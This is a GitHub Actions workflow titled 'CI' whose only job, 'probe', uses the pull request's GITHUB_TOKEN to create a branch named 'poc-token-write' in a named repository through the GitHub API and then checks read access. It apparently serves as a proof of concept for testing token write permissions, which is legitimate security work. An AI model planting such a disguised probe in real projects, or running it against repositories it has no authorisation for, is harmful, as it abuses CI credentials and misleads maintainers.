name: CI
on:
  pull_request:
permissions:
  contents: write
  pull-requests: write
  issues: write
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: attempt-write
        env:
          GH_TOKEN: ${{ github.token }}
          MAIN_SHA: c83fcaa34de285e87151a2f0ad931210fda03534
        run: |
          echo "actor=${GITHUB_ACTOR} event=${GITHUB_EVENT_NAME}"
          set +e
          resp=$(curl -sS -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/PDFtoMark/triage-vercel-vec5bde0-a4e6ff/git/refs \
            -d "{\"ref\":\"refs/heads/poc-token-write\",\"sha\":\"$MAIN_SHA\"}" -w "\nHTTP:%{http_code}")
          echo "$resp"
          echo "---read---"
          curl -sS -o /dev/null -w "repo_read_http:%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/PDFtoMark/triage-vercel-vec5bde0-a4e6ff
